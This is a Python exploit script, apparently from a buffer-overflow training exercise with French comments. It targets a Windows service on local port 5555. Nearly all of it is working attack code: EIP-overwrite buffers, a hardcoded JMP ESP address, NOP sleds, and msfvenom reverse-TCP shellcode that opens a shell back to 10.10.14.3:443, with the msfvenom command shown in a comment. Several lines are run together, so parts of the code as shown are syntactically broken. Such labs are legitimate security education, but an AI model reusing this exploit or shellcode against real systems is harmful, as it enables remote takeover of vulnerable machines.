## BOF WINDOWS JMP ESP
import socket,sys#https://github.com/gh0x0st/Buffer_Overflow

address = '127.0.0.1'port = 5555
Name= b'Admin'
Password= b'P@$$worD'
#récecriture de l'EIP par 424242
buffer1 = Password + b'A'*1020 + b"B"*4 #BoF ok, récriture de la valeur de l'EIP par 424242
##récecriture de l'EIP par 42424242 et ESP pointe vers "CDDDDDDD"
buffer2 = Password + b'A'*1020 + b"B"*4 + b"C" + b"D"*200

#ADRESSE de début des AAAAA: 00FBF854#ADRESSE de l'EIP: 00FBFC50 (adresse varie avec l'aslr... 

retour = b"\x73\x6d\x47\x10" # JMP ESP a l'adresse 10476d73 (trouvé via le debugger)

#TO DO: trier les badchars
#└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -b "\x00" -f py

buf =  b""buf += b"\xda\xc2\xb8\x8b\xd1\x66\x71\xd9\x74\x24\xf4\x5b\x2b"buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x13\x03\xc8\xc2\x84"buf += b"\x84\x32\x0c\xca\x67\xca\xcd\xab\xee\x2f\xfc\xeb\x95"buf += b"\x24\xaf\xdb\xde\x68\x5c\x97\xb3\x98\xd7\xd5\x1b\xaf"buf += b"\x50\x53\x7a\x9e\x61\xc8\xbe\x81\xe1\x13\x93\x61\xdb"buf += b"\xdb\xe6\x60\x1c\x01\x0a\x30\xf5\x4d\xb9\xa4\x72\x1b"buf += b"\x02\x4f\xc8\x8d\x02\xac\x99\xac\x23\x63\x91\xf6\xe3"buf += b"\x82\x76\x83\xad\x9c\x9b\xae\x64\x17\x6f\x44\x77\xf1"buf += b"\xa1\xa5\xd4\x3c\x0e\x54\x24\x79\xa9\x87\x53\x73\xc9"buf += b"\x3a\x64\x40\xb3\xe0\xe1\x52\x13\x62\x51\xbe\xa5\xa7"buf += b"\x04\x35\xa9\x0c\x42\x11\xae\x93\x87\x2a\xca\x18\x26"buf += b"\xfc\x5a\x5a\x0d\xd8\x07\x38\x2c\x79\xe2\xef\x51\x99"buf += b"\x4d\x4f\xf4\xd2\x60\x84\x85\xb9\xec\x69\xa4\x41\xed"buf += b"\xe5\xbf\x32\xdf\xaa\x6b\xdc\x53\x22\xb2\x1b\x93\x19"buf += b"\x02\xb3\x6a\xa2\x73\x9a\xa8\xf6\x23\xb4\x19\x77\xa8"buf += b"\x44\xa5\xa2\x7f\x14\x09\x1d\xc0\xc4\xe9\xcd\xa8\x0e"buf += b"\xe6\x32\xc8\x31\x2c\x5b\x63\xc8\xa7\x6e\x7e\xdc\x34"buf += b"\x07\x7c\xe0\x3b\x6c\x09\x06\x51\x82\x5c\x91\xce\x3b"buf += b"\xc5\x69\x6e\xc3\xd3\x14\xb0\x4f\xd0\xe9\x7f\xb8\x9d"buf += b"\xf9\xe8\x48\xe8\xa3\xbf\x57\xc6\xcb\x5c\xc5\x8d\x0b"buf += b"\x2a\xf6\x19\x5c\x7b\xc8\x53\x08\x91\x73\xca\x2e\x68"buf += b"\xe5\x35\xea\xb7\xd6\xb8\xf3\x3a\x62\x9f\xe3\x82\x6b"buf += b"\x9b\x57\x5b\x3a\x75\x01\x1d\x94\x37\xfb\xf7\x4b\x9e"buf += b"\x6b\x81\xa7\x21\xed\x8e\xed\xd7\x11\x3e\x58\xae\x2e"buf += b"\x8f\x0c\x26\x57\xed\xac\xc9\x82\xb5\xdd\x83\x8e\x9c"buf += b"\x75\x4a\x5b\x9d\x1b\x6d\xb6\xe2\x25\xee\x32\x9b\xd1"buf += b"\xee\x37\x9e\x9e\xa8\xa4\xd2\x8f\x5c\xca\x41\xaf\x74"


buffer3 =  b'A'*1028 + retour + b'\x90'*40 + buf + b'\x90'*40


try:
    print('[+] Connexion')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
    s.connect((address,port))
    r = s.recv(1024)    print(r)
    print('[+] Sending Access Name')    
    s.send(Name + b'\r\n')    
    r = s.recv(1024)    
    print(r) #Acces Password
    """    
    print('[+] Sending Access Password')    
    s.send(Password + b'\r\n')    
    r = s.recv(1024)    print(r) #Correct Password
    """
    print('[+] Sending buffer1')    
    s.send(buffer3 + b'\r\n')    
    r = s.recv(1024)    
    print(r) #Acces Password  
except:    
    print('[!] Error')    
    sys.exit(0)
finally:
    s.close()

